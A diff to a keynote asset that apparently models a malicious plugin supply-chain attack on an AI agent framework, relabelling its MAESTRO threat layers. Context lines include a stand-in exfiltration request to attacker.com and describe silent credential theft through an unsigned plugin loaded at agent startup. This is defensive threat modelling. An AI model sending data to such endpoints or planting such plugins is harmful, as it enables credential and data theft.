@@ -2,7 +2,7 @@
 ## Visual Asset for CISO London Summit Keynote
 
 **Scenario:** Malicious Plugin Supply Chain Attack
-**MAESTRO Layers:** Agent Framework (2), Extensions (3), Runtime (6)
+**MAESTRO Layers:** Agent Frameworks (3), Agent Ecosystem (7), Deployment and Infrastructure (4)
 **Time to Exploit:** 5 minutes
 **Business Impact:** Complete system compromise + credential theft
 
@@ -111,9 +111,9 @@ async init(config: Record<string, string>, runtime: IAgentRuntime) {
 ```
 
 **MAESTRO Layers:**
-- Agent Framework (2): Runtime access
-- Extensions (3): Plugin initialization
-- Runtime (6): Service registration
+- Agent Frameworks (3): Runtime access
+- Agent Ecosystem (7): Plugin initialization
+- Deployment and Infrastructure (4): Service registration
 
 **Security Boundary Violated:**
 - No plugin signature verification
@@ -167,7 +167,7 @@ bun start
 # [INFO] Agent ready
 ```
 
-**MAESTRO Layer:** Agent Framework (2)
+**MAESTRO Layer:** Agent Frameworks (3)
 **Security Boundary:** Trust assumption (all plugins are safe)
 **Business Impact:** Silent compromise with no alerts
 
@@ -191,7 +191,7 @@ POST https://attacker.com/exfil
 }
 ```
 
-**MAESTRO Layer:** Security & Trust (4)
+**MAESTRO Layer:** Security and Compliance (6)
 **Business Impact:** $50,000 API credit theft + database access
 
 #### 6B: Conversation Monitoring
